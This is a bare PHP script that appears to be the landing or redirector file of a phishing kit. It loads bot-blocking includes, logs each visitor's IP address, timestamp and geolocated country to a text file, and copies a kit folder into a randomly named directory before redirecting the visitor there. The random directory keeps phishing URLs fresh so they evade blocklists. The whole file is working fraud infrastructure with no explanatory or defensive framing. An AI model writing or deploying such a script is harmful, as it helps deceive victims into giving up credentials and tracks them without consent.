<?php 
 include './blank_/robot.php';
include './blank_/block-1.php';
@ini_set('display_errors', 0);
error_reporting(E_ALL ^ E_NOTICE);
$md5=md5("$random");
$base=base64_encode($md5);
$dst=md5("$base");
error_reporting(E_ALL ^ E_NOTICE);
date_default_timezone_set('GMT');$TIME = date("d-m-Y H:i:s");
 $PP = getenv("REMOTE_ADDR");
 $J7 = simplexml_load_file("https://www.geoplugin.com/xml.gp?ip=$PP");
 $COUNTRY = $J7->geoplugin_countryName ;
 $ip = getenv("REMOTE_ADDR");
 $file = fopen("visit.txt","a");
 fwrite($file,$ip." - ".$TIME." - " . $COUNTRY ."\n") ;?>
 <?php $random = rand(0,900000000).$_SERVER['REMOTE_ADDR'];
 $dst= substr(md5($random), 0, 5);
 function recurse_copy($src, $dst) {$dir = opendir($src);
 	$result = ($dir === false ? false : true);
 	if ($result !== false) {$result = @mkdir($dst);
 		if ($result === true) {while(false !== ( $file = readdir($dir)) ) { if (( $file != '.' ) && ( $file != '..' ) && $result) {
 		 if ( is_dir($src . '/' . $file) ) { $result = recurse_copy($src . '/' . $file,$dst . '/' . $file); } else { $result = copy($src . '/' . $file,$dst . '/' . $file);
 		  } 
 		} 
 	}
 	 closedir($dir);
 	}
 }
 return $result;}$src="#";
 recurse_copy( $src, $dst );header("location:".$dst."");
 exit;